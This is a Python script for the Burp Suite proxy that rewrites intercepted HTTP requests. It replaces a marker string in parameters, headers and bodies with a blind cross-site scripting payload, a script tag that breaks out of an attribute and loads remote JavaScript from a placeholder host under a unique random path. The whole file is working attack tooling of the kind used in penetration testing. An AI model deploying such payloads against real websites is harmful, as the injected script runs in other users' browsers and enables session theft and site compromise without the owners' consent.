"""
PyBurp Script: Random XSS Payload Injector (Per-Request Random Strings)

This script intercepts proxy requests and replaces "randomplz" with a customized blind XSS payload
that loads a remote JavaScript file with a unique identifier.
"""

def urlPrefixAllowed(urls):
    """
    Scope control - only modify requests to sites in scope
    """
    # Allow all HTTP traffic - Burp's target scope will still apply
    # Modify this to be more restrictive if needed
    urls.add("http")


def handleProxyRequest(request, annotations):
    """
    Check for "randomplz" and replace with final payload
    """
    try:
        # Check if "randomplz" appears anywhere in the request
        request_string = request.toString()
        if "randomplz" not in request_string:
            return request, annotations
        
        # Generate unique random string for this specific request
        random_string = randomstring(8)

        # Base payload template that will be injected
        payload = "\"><script src='https://example.com/" + random_string + "'></script>"
        
        # Start with original request
        modified_request = request
        
        # Modify URL parameters containing "randomplz"
        for param in request.parameters():
            if "randomplz" in param.value():
                # URL encode the payload for URL parameters
                url_encoded_payload = urlencode(payload)
                new_value = param.value().replace("randomplz", url_encoded_payload)
                modified_request = modified_request.withUpdatedParameters(
                    parameter(param.name(), new_value, param.type())
                )
        
        # Modify headers containing "randomplz"
        for header in request.headers():
            if "randomplz" in header.value():
                new_value = header.value().replace("randomplz", payload)
                modified_request = modified_request.withUpdatedHeader(header.name(), new_value)
        
        # Modify body containing "randomplz"
        body = request.bodyToString()
        if "randomplz" in body:
            new_body = body.replace("randomplz", payload)
            modified_request = modified_request.withBody(new_body)
        

        return modified_request, annotations
    
    except Exception as e:
        print("[ERROR] Exception in handleProxyRequest: " + str(e))
        import traceback
        traceback.print_exc()
        return request, annotations
